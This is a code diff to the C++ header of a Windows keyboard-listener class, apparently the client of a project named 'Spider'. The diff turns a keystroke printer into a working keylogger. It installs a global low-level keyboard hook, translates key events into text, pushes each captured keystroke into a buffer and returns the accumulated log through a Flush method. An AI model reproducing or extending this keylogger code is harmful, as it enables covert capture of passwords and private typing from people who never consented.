@@ -7,11 +7,10 @@
 
 #include <Windows.h>
 #include <vector>
-#include <iostream>
-#include <string>
 #include "IWindowsKeyListener.hpp"
 
 HHOOK hhkLowLevelKybd;
+IWindowsKeyListener *windowsKeyListener;
 
 class WindowsKeyListener : public IWindowsKeyListener {
 public:
@@ -19,28 +18,41 @@ public:
 		UnhookWindowsHookEx(hhkLowLevelKybd);
 	}
 
-	void Run() {
-		hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
+	void Run() override final
+	{
+		hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(nullptr), 0);
 		MSG msg;
-		GetMessage(&msg, NULL, NULL, NULL);
+		GetMessage(&msg, nullptr, NULL, NULL); // Windows message loop keepalive. This will block the current thread.
 	}
 	
-	std::string Flush() {
-		return ("");
+	std::string Flush() override final {
+		std::string result;
+		for (auto const& s : _capturedInputs) { result += s; }
+		_capturedInputs.clear();
+		return result;
 	}
-	
+
+	void PushKeylog(std::string &keylog) override final {
+		_capturedInputs.push_back(keylog);
+	}
+
+	WindowsKeyListener()
+	{
+		// Set global variable mendatory for hook to access appContext.
+		windowsKeyListener = this;
+	}
+
 private:
 	static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wp, LPARAM lp)
 	{
 		if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
-			static bool capslock = false;
-			static bool shift = false;
+			static auto capslock = false;
+			static auto shift = false;
 			char tmp[0xFF] = { 0 };
 			std::string str;
 			DWORD msg = 1;
-			KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
+			auto st_hook = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lp);
 			bool printable;
-
 
 			msg += (st_hook.scanCode << 16);
 			msg += (st_hook.flags << 24);
@@ -88,14 +100,14 @@ private:
 				shift = false;
 			}
 
-			std::cout << str << std::endl;
+			windowsKeyListener->PushKeylog(str);
 		}
 
 		return CallNextHookEx(hhkLowLevelKybd, code, wp, lp);
 	}
 
 private:
-	std::vector<std::string> _capturedCharacters;
+	std::vector<std::string> _capturedInputs;
 };
 
 #endif //SPIDER_CLIENT_WINDOWSKEYLISTENER_HPP
